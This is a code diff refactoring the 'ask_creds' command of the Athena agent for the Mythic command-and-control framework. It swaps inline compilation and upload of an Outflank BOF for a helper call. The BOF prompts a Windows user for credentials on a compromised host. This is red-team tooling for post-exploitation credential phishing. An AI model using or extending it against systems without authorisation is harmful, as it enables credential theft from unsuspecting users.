@@ -1,12 +1,9 @@
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
+from ..athena_utils.mythicrpc_utilities import create_mythic_file
 from ..athena_utils.bof_utilities import *
 import json
-import binascii
-import cmd 
-import struct
 import os
-import subprocess
 
 
 class AskCredsArguments(TaskArguments):
@@ -64,25 +61,8 @@ Credit: The Outflank team for the original BOF - https://github.com/outflanknl/C
 
         arch = taskData.Callback.Architecture
 
-
         if(arch=="x86"):
             raise Exception("BOF's are currently only supported on x64 architectures")
-
-
-        bof_path = f"/Mythic/athena/mythic/agent_functions/outflank_bofs/ask_creds/ask_creds.{arch}.o"
-        if(os.path.isfile(bof_path) == False):
-            await compile_bof("/Mythic/athena/mythic/agent_functions/outflank_bofs/ask_creds/")
-
-        # Read the COFF file from the proper directory
-        with open(bof_path, "rb") as f:
-            coff_file = f.read()
-
-        # Upload the COFF file to Mythic, delete after using so that we don't have a bunch of wasted space used
-        file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
-                taskData.Task.ID,
-                DeleteAfterFetch = True,
-                FileContents = coff_file,
-            ))
         
         encoded_args = ""
         reason = taskData.args.get_arg("reason")
@@ -98,9 +78,8 @@ Credit: The Outflank team for the original BOF - https://github.com/outflanknl/C
 
             # Serialize our arguments into a single buffer and base64 encode it
             encoded_args = base64.b64encode(SerializeArgs(OfArgs)).decode()
-
-
-
+        
+        file_id = await compile_and_upload_bof_to_mythic(taskData.Task.ID,"outflank_bofs/ask_creds",f"ask_creds.{arch}.o")
         # Delegate the execution to the coff command, passing: 
         #   the file_id from our create_file RPC call
         #   the functionName which in this case is go
@@ -111,7 +90,7 @@ Credit: The Outflank team for the original BOF - https://github.com/outflanknl/C
             CommandName="coff",
             SubtaskCallbackFunction="coff_completion_callback",
             Params=json.dumps({
-                "coffFile": file_resp.AgentFileId,
+                "coffFile": file_id,
                 "functionName": "go",
                 "arguments": encoded_args,
                 "timeout": "60",
